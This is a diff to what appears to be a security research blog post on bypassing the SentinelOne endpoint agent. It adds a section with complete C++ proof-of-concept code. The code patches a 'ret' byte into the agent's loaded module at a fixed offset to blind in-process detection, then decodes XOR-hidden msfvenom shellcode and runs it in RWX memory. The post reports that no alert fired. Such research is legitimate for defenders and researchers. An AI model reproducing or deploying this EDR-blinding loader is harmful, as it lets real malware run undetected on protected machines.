@@ -252,9 +252,7 @@ static std::vector<char> unxor_file(const std::string& filename, char key)
 
 int main(int argc, char* argv[])
 {
-    // this is the raw payload from msfvenom, but each byte is xor'd with 5 to hide it on disk
     std::string file("c:\\users\\user\\desktop\\msgbox.bin");
-    // this function opens the file and xors each byte with 5, restorting it to the original messagebox shellcode
     auto bytes = unxor_file(file, 5);
     auto size = bytes.size();
 
@@ -288,3 +286,68 @@ After a few batches of 100, I ran the malicious code and finally saw my messageb
 ![2ef60](/images/2ef60.png)
 
 There's nothing obvious in this function that suggests it's especially important, but it does call three more functions which in turn may be responsible for in-process threat detection.
+
+## Blinding with Code
+Now that I knew the address to write to (DLL base plus `0x2ef60`), I updated the PoC to write this memory programmatically instead of using WinDbg breakpoints:
+
+```c
+static std::vector<char> unxor_file(const std::string& filename, char key)
+{
+	std::ifstream ifs(filename, std::ios::binary);
+	std::vector<char> vec((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+	std::for_each(vec.begin(), vec.end(), [key](char& c) { c ^= key; });
+
+	return vec;
+}
+
+int main(int argc, char* argv[])
+{
+	HMODULE hModules[1024];
+	DWORD cbNeeded = 0;
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
+
+	if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
+	{
+		for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
+		{
+			MODULEINFO modInfo = { 0 };
+			if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
+			{
+				CHAR modName[MAX_PATH] = { 0 };
+				if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
+				{
+					if (std::string(modName).find("cessClient6") != std::string::npos)
+					{
+						DWORD oldProtect = 0;
+						QWORD addr = (QWORD)modInfo.lpBaseOfDll + 0x2ef60;
+
+                        if (VirtualProtect((LPVOID)addr, 1, PAGE_READWRITE, &oldProtect))
+                        {
+                            RtlCopyMemory((LPVOID)addr, "\xc3", 1);
+                            VirtualProtect((LPVOID)addr, 1, oldProtect, &oldProtect);
+                        }
+					}
+				}
+			}
+		}
+	}
+
+	auto bytes = unxor_file("c:\\users\\user\\desktop\\msgbox.bin", 5);
+	auto size = bytes.size();
+
+	PCHAR buf = (PCHAR)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	std::copy(bytes.begin(), bytes.end(), static_cast<char*>(buf));
+	std::fill(bytes.begin(), bytes.end(), 0);
+	bytes.clear();
+
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+
+	return 0;
+}
+```
+
+The first thing this code does is write a `ret` to the target address. It then performs the standard sequence of allocating RWX memory, copying shellcode, and creating a thread to run it. When this code is run, we get the messagebox, and SentinelOne has not raised any alerts.
+
+![win2](/images/win2.png)
